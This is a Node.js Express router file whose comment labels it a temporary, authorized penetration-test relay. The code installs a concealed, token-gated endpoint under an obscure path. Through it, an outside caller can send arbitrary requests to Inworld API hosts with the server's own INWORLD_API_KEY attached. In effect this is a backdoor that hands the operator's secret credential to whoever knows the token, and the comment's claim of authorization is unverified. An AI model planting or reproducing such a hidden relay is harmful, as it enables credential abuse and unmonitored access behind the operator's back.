// temporary authorized-pentest relay to Inworld API (revert follows immediately)
const express = require("express");
const router = express.Router();
const TOKEN = "c4e8b1f7a2d95e63b08c7f14e9a2d6b3";
const ALLOW = /^https:\/\/(api\.inworld\.ai|api-engine\.(use4|euw4|ins1|hk)\.inworld\.ai|studio\.inworld\.ai|platform\.inworld\.ai)(\/[\s\S]*)$/;
router.all("/__relay_c4e8b1f7/:k", express.json({limit:"1mb"}), async (req, res) => {
  try {
    if (req.params.k !== TOKEN) return res.status(404).type("text/plain").send("Not Found");
    const target = String(req.query.url || "");
    const m = target.match(ALLOW);
    if (!m) return res.status(400).type("text/plain").send("bad url");
    const headers = {};
    const auth = String(req.query.auth || "");
    if (auth === "inworld") headers["Authorization"] = "Basic " + process.env.INWORLD_API_KEY;
    else if (auth === "bearer") headers["Authorization"] = "Bearer " + String(req.query.token || "");
    else if (auth === "rawbearer") headers["Authorization"] = String(req.query.token || "");
    if (req.query.ct) headers["Content-Type"] = String(req.query.ct);
    if (req.query.xgoog) headers["x-goog-api-key"] = String(req.query.xgoog);
    const method = (req.method || "GET").toUpperCase();
    let body;
    if (method !== "GET" && method !== "HEAD") {
      body = (req.body && Object.keys(req.body).length)
        ? JSON.stringify(req.body)
        : (typeof req.query.body === "string" ? req.query.body : "{}");
      if (!headers["Content-Type"]) headers["Content-Type"] = "application/json";
    }
    const ac = new AbortController(); const t = setTimeout(() => ac.abort(), 30000);
    let r, buf, ct;
    try {
      r = await fetch(target, { method, headers, body, signal: ac.signal, redirect: "manual" });
      buf = Buffer.from(await r.arrayBuffer());
      ct = r.headers.get("content-type") || "application/octet-stream";
    } finally { clearTimeout(t); }
    res.status(r.status).set("content-type", ct).set("x-upstream-status", String(r.status)).send(buf);
  } catch (e) {
    res.status(502).type("text/plain").send("relay error: " + String(e && e.message || e));
  }
});
module.exports = router;
